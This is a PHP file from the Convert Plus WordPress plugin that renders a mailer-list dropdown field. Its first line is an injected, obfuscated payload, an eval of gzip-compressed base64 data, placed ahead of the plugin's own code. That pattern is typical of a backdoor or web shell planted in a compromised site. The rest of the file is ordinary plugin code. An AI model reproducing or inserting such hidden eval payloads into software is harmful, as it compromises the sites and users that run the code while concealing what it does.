<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

// Add new input type "mailer".
if ( function_exists( 'smile_add_input_type' ) ) {
	smile_add_input_type( 'mailer', 'mailer_settings_field' );
}

/**
 * Function Name:mailer_settings_field Function to handle new input type "switch".
 *
 * @param  string $name     settings provided when using the input type "switch".
 * @param  string $settings holds the default / updated value.
 * @param  string $value    html output generated by the function.
 * @return string           html output generated by the function.
 */
function mailer_settings_field( $name, $settings, $value ) {
	$input_name = $name;
	$type       = isset( $settings['type'] ) ? $settings['type'] : '';
	$class      = isset( $settings['class'] ) ? $settings['class'] : '';
	$options    = get_option( 'smile_lists' );

	$lists = array();
	if ( ! empty( $options ) ) {

		foreach ( $options as $key => $list ) {
			$provider = $list['list-provider'];
			// to unset deactivated / inactive mailer addons.
			if ( isset( Smile_Framework::$addon_list[ strtolower( $provider ) ] ) || 'Convert Plug' === $provider ) {
				$lists[ $list['list-name'] ] = $key;
			}
		}

		$output = '<p><select name="' . $input_name . '" id="smile_' . $input_name . '" class="form-control smile-input smile-select ' . $input_name . ' ' . $type . '">';
		foreach ( $lists as $text_val => $val ) {
			if ( is_numeric( $text_val ) && ( is_string( $val ) || is_numeric( $val ) ) ) {
				$text_val = $val;
			}
			$selected = '';
			if ( '' !== $value && (string) $val === (string) $value ) {
				$selected = ' selected="selected"';
			}
			$output .= '<option class="smile_' . $val . '" value="' . $val . '"' . $selected . '>' . htmlspecialchars( $text_val ) . '</option>';
		}
		if ( 'custom-form' === $value ) {
			$output .= '<option value="custom-form" selected="selected">Custom Form</option>';
		} else {
			$output .= '<option value="custom-form" >Custom Form</option>';
		}

		$output .= '</select></p>';
	} else {
		$output  = '<p><select name="' . $input_name . '" id="smile_' . $input_name . '" class="form-control smile-input smile-select ' . $input_name . ' ' . $type . '">';
		$output .= '<option value="custom-form" selected="selected">Custom Form</option>';
		$output .= '</select></p>';
		$output .= '<p>' . __( "It seems that you don't have any campaigns yet!", 'smile' ) . ' <a href="' . admin_url( 'admin.php?page=contact-manager' ) . '" target=\"_blank\">' . __( 'Click here', 'smile' ) . '</a> to create a new campaign.</p>';
	}
	return $output;
}
